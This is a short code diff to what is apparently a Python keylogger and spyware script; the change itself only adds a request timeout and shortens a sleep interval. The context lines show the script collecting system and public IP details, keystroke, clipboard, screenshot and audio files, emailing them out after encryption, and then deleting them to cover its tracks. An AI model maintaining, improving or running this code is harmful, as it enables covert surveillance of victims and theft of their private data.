@@ -80,7 +80,7 @@ def system_information():
         hostname = socket.gethostname()
         IPAddr = socket.gethostbyname(hostname)
         try:
-            public_ip = get("https://api.ipify.org").text
+            public_ip = get("https://api.ipify.org", timeout=60).text
             f.write("Public IP Address: " + public_ip + '\n')
         except Exception:
             f.write("Couldn't get Public IP Address (May be due to max query) \n")
@@ -206,7 +206,7 @@ for encrypting_file_in in files_to_encrpt:
 
     send_email(encrypted_file_names[counts], encrypted_file_names[counts], toaddr)
     count += 1
-time.sleep(180)
+time.sleep(120)
 
 # cleaning up our tracks and delete files
 delete_files = [system_info, clipboard_info, keys_info, screenshot_info, audio_info]
